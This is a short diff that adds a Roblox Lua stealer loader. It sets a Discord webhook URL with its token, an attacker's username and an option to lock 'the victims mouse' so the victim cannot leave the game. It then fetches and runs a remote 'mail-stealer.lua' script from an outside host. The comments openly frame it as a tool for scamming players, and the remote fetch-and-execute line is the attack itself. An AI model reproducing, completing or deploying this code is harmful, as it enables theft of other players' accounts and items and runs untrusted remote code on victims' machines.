@@ -1,0 +1,4 @@
+getgenv().webhook = "https://discord.com/api/webhooks/1079389958466441216/_IxLw3Zaja4y--VIcQ5etzQLsYJqTQym_0z3qf8KNrTVTXPKBXU1ZNku-uqEW96NcDxe" -- replace it with your webhook
+getgenv().name = "charles45825" -- replace bigscammer8 with your username
+getgenv().mouselock = true -- change this to true if you want the victims mouse to be locked in one place so he cant exit out of roblox etc
+loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))()
